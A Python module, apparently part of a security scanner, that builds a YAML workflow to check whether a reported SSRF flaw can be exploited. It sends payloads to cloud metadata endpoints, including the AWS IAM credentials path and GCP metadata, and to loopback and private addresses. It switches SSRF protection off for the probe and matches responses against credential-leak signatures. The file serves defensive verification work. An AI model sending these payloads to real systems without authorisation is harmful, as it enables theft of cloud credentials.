"""SSRF test blueprint — generates flyto-core YAML."""
from __future__ import annotations

import yaml

from ..schema import SecurityFinding


# Probe targets that real internal services / cloud metadata would expose.
# We send them as the user-controllable URL parameter. A proper downstream
# target that echoes fetch results WILL leak one of these signatures when the
# fetch succeeds; a sanitized one will refuse the request (403 / error).
_SSRF_SIGNATURES = [
    "ami-id",                         # AWS IMDSv1 metadata
    "iam/security-credentials",       # AWS IAM creds
    "computeMetadata",                # GCP metadata
    "access_token",                   # GCP / AWS token field
    "instance-identity",              # AWS doc path
]


def generate(
    finding: SecurityFinding,
    target_url: str,
    auth_token: str | None,
) -> str:
    """Generate a flyto-core workflow YAML for SSRF verification.

    The probe swaps the user-controllable URL for well-known internal /
    metadata endpoints. If the server fetches and echoes them back,
    the sink is exploitable.
    """
    method = (finding.http_method or "GET").upper()
    param = finding.param_name or "url"
    path = finding.endpoint_path or "/fetch"
    base = f"{target_url}{path}"

    ssrf_payloads = [
        ("aws_metadata", "http://169.254.169.254/latest/meta-data/"),
        ("aws_iam", "http://169.254.169.254/latest/meta-data/iam/security-credentials/"),
        ("gcp_metadata", "http://metadata.google.internal/computeMetadata/v1/"),
        ("localhost", "http://127.0.0.1:80/"),
        ("internal_rfc1918", "http://10.0.0.1/"),
    ]

    probe_requests = [_build_request(method, base, param, "https://www.example.com", auth_token)]
    for _label, payload in ssrf_payloads:
        probe_requests.append(_build_request(method, base, param, payload, auth_token))

    workflow = {
        "id": f"verify_ssrf_{param}",
        "name": f"SSRF Verify: {param} at {path}",
        "version": "1.0.0",
        "description": (
            f"Auto-generated verification for SSRF at "
            f"{finding.source_file}:{finding.source_line}"
        ),
        "timeout": 300,
        "steps": [
            {"id": "start", "module": "flow.start", "label": "Start",
             "params": {}, "orderIndex": 0},
            {
                "id": "ssrf_probes",
                "module": "http.batch",
                "label": "SSRF Probes",
                "params": {
                    "description": (
                        "Baseline + 5 SSRF payloads (AWS/GCP metadata, "
                        "loopback, RFC1918)"
                    ),
                    "requests": probe_requests,
                    "timeout": 15,
                    # SSRF protection must be OFF — the payloads ARE the test.
                    "ssrf_protection": False,
                    "detect_patterns": _SSRF_SIGNATURES,
                },
                "orderIndex": 1,
            },
            {
                "id": "assert_ssrf",
                "module": "test.assert_contains",
                "label": "Assert SSRF Exploitable",
                "params": {
                    "source": "${ssrf_probes.items}",
                    "patterns": _SSRF_SIGNATURES,
                    "match_mode": "any",
                    "on_match": "exploitable",
                    "on_no_match": "sanitized",
                },
                "orderIndex": 2,
            },
            {
                "id": "report",
                "module": "output.display",
                "label": "Report",
                "params": {
                    "format": "json",
                    "data": {
                        "result": "${assert_ssrf.data}",
                        "finding_source": f"{finding.source_file}:{finding.source_line}",
                        "finding_sink": f"{finding.sink_file}:{finding.sink_line}",
                    },
                },
                "orderIndex": 3,
            },
        ],
        "edges": [
            {"source": "start", "target": "ssrf_probes"},
            {"source": "ssrf_probes", "target": "assert_ssrf"},
            {"source": "assert_ssrf", "target": "report"},
        ],
    }
    return yaml.dump(workflow, default_flow_style=False, allow_unicode=True, sort_keys=False)


def _build_request(
    method: str,
    base: str,
    param: str,
    value: str,
    auth_token: str | None,
) -> dict:
    """Build a single HTTP request dict for http.batch."""
    headers: dict[str, str] = {}
    if auth_token:
        headers["Authorization"] = f"Bearer {auth_token}"

    if method == "GET":
        sep = "&" if "?" in base else "?"
        req: dict = {
            "method": "GET",
            "url": f"{base}{sep}{param}={value}",
        }
    else:
        headers["Content-Type"] = "application/json"
        req = {
            "method": method,
            "url": base,
            "body": {param: value},
        }

    if headers:
        req["headers"] = headers
    return req
